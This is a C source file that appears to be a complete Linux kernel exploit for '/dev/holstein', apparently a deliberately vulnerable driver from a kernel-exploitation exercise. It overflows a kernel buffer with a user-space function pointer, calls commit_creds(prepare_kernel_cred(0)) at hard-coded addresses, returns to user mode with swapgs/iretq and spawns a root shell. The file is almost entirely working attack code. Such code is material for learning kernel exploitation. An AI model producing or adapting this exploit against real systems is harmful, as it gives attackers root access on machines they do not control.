#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

#define commit_creds 0xffffffff8106e390
#define prepare_kernel_cred 0xffffffff8106e240
#define pop_rdi 0xffffffff8127bbdc
#define pop_rcx 0xffffffff812ea083
#define mov_rdi_rax_rep 0xffffffff8160c96b
#define swapgs_ret 0xffffffff8160bf7e
#define iretq 0xffffffff8180138b

static void escalate_privilege() {
    char* (*pkc)(int) = (void*)(prepare_kernel_cred);
    void (*cc)(char*) = (void*)(commit_creds);
    (*cc)((*pkc)(0));
    restore_state();
}


static void exploit() {
    int fd = open("/dev/holstein", O_RDWR);

    char buf[0x500];
    memset(buf, 'A', 0x408);
    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
    
    write(fd, buf, 0x410);
    close(fd);

    return;
}

int main() {    
    save_state();
    exploit();

    return 0;
}